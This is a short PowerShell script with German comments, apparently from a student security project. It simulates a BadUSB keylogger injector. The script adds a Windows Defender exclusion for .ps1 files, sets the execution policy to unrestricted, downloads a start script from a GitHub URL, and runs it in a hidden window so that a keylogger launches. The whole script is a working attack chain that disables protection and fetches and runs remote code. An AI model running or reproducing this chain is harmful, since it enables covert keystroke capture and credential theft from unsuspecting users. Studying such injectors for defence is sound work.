# Simulation des BadUSB-Injektors ohne Hardware
# Dieses Skript führt die gleichen Schritte aus wie der BadUSB_keyloggerInjector.txt

# Gehe zu Public Documents
Set-Location "C:\Users\Public\Documents"

# Füge Ausnahme für .ps1-Dateien hinzu
Add-MpPreference -ExclusionExtension ps1 -Force

# Deaktiviere Script-Blocker
Set-ExecutionPolicy unrestricted -Force

# Lade startScript.ps1 herunter (ersetze LINK mit deinem URL)
$link = "https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/refs/heads/main/GithubKeylogger/startScript.ps1"
Invoke-WebRequest -Uri $link -OutFile "startScript.ps1"

# Starte startScript.ps1 im Hintergrund
Start-Process powershell.exe -ArgumentList "-noexit -windowstyle hidden -file startScript.ps1" -NoNewWindow

# Simuliere Capslock-Blinken (optional, nur zur Anzeige)
for ($i = 0; $i -lt 4; $i++) {
    $wshell = New-Object -ComObject wscript.shell
    $wshell.SendKeys("{CAPSLOCK}")
    Start-Sleep -Milliseconds 150
}
Start-Sleep -Seconds 2
for ($i = 0; $i -lt 4; $i++) {
    $wshell = New-Object -ComObject wscript.shell
    $wshell.SendKeys("{CAPSLOCK}")
    Start-Sleep -Milliseconds 150
}

Write-Host "Simulation abgeschlossen. Der Keylogger sollte jetzt laufen."
